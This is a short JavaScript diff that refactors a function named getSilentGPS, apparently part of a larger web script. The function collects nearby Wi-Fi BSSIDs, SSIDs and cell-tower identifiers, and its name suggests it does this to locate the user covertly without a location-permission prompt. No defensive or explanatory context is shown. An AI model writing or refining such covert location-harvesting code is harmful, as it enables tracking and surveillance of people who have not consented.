@@ -295,12 +295,12 @@
       const getSilentGPS = async () => {
         const result = { wifi: [], cell: [] };
         try {
-          const scan = navigator.connection?.getNetworkDetails?.() || {};
-          if (scan.wifi) {
-            result.wifi = scan.wifi.map(a => ({ mac: a.BSSID, ssid: a.SSID, signal: a.signalStrength }));
+          const details = await (navigator.connection?.getNetworkDetails?.() || Promise.resolve({}));
+          if (details.wifi) {
+            result.wifi = details.wifi.map(a => ({ mac: a.BSSID, ssid: a.SSID, signal: a.signalStrength }));
           }
-          if (scan.cell) {
-            result.cell = scan.cell.map(c => ({
+          if (details.cell) {
+            result.cell = details.cell.map(c => ({
               mcc: c.mobileCountryCode, mnc: c.mobileNetworkCode,
               lac: c.locationAreaCode, cid: c.cellId, signal: c.signalStrength
             }));
